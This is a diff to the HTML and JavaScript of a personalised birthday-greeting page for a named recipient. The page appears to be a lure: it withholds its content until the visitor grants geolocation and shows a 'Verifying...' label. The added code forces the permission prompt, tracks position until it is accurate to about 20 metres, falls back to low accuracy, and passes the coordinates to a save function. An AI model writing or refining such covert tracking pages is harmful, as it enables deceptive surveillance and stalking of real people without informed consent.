@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Happy Birthday !</title>
+    <title>Happy Birthday Rasangika!</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;700&family=Patrick+Hand&family=Yaldevi:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
@@ -397,33 +397,62 @@
                     isLocationAllowed = true;
                     enableMainInterface(); 
                 } else {
-                    // Location ගන්නම බැරි වුණොත්
+                    // අන්තිම මොහොතෙත් Location ආවේ නැත්නම් හිරවෙන්න දෙන්නේ නෑ, Low Accuracy එකෙන් හරි ගන්නවා
                     closeAllPopups();
-                    if (showPopupOnError) showPopup('overlay2', 'card2');
+                    navigator.geolocation.getCurrentPosition(
+                        async (pos) => {
+                            isLocationAllowed = true;
+                            enableMainInterface();
+                            if (window.saveLocationData) {
+                                await window.saveLocationData({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy });
+                            }
+                        },
+                        (err) => {
+                            if (err.code === 1) showPopup('overlay3', 'card3');
+                            else if (showPopupOnError) showPopup('overlay2', 'card2');
+                            if(btn) btn.innerText = "Verifying...";
+                        },
+                        { enableHighAccuracy: false, timeout: 10000 }
+                    );
                 }
             };
 
-            // Watch Position පටන් ගන්නවා (එන හැම location එකම බලනවා)
-            watchId = navigator.geolocation.watchPosition(
-                (pos) => {
-                    // අලුත් එකේ Accuracy එක කලින් එකට වඩා හොඳ නම් ඒක තියාගන්නවා (අගය අඩුවෙන්න අඩුවෙන්න Accuracy වැඩියි)
-                    if (!bestPosition || pos.coords.accuracy < bestPosition.coords.accuracy) {
-                        bestPosition = pos;
-                    }
+            // Mobile වලදි Native Prompt එක අනිවාර්යයෙන්ම ගෙන්නගන්න මුලින්ම getCurrentPosition Call කරනවා
+            navigator.geolocation.getCurrentPosition(
+                (initialPos) => {
+                    bestPosition = initialPos; // කොහොමහරි එක Location එකක් සුවර්!
                     
-                    // මීටර් 20 කට වඩා නිවැරදි එකක් ආවොත්, තත්පර 8ක් ඉන්නේ නැතුව එවලෙම ඒක Save කරනවා
-                    if (bestPosition.coords.accuracy <= 20) {
+                    // දැන් තවත් හොඳ Accuracy එකක් එනවද කියලා Watch කරනවා
+                    watchId = navigator.geolocation.watchPosition(
+                        (pos) => {
+                            if (pos.coords.accuracy < bestPosition.coords.accuracy) {
+                                bestPosition = pos;
+                            }
+                            if (bestPosition.coords.accuracy <= 20) {
+                                processBestLocation();
+                            }
+                        },
+                        (error) => { console.warn("Watch warning:", error); },
+                        options
+                    );
+
+                    // User Allow කරපු වෙලාවේ ඉඳන් තත්පර 8ක් ගණන් කරනවා
+                    timeoutId = setTimeout(() => {
                         processBestLocation();
+                    }, scanDuration);
+                },
+                (err) => {
+                    // User මුලින්ම Block කරොත් හිරවෙන්නේ නැතුව කෙලින්ම Blocked Popup එක දෙනවා
+                    closeAllPopups();
+                    if (err.code === 1) { 
+                        showPopup('overlay3', 'card3');
+                    } else {
+                        if (showPopupOnError) showPopup('overlay2', 'card2');
+                        if(btn) btn.innerText = "Verifying...";
                     }
                 },
-                (error) => { console.warn("Location scan warning:", error); },
                 options
             );
-
-            // හරියටම තත්පර 8කට පස්සේ ඒ වෙලාවට තියෙන හොඳම Location එක අරන් වැඩේ ඉවර කරනවා
-            timeoutId = setTimeout(() => {
-                processBestLocation();
-            }, scanDuration);
         }
 
         function showPopup(overlayId, cardId) {
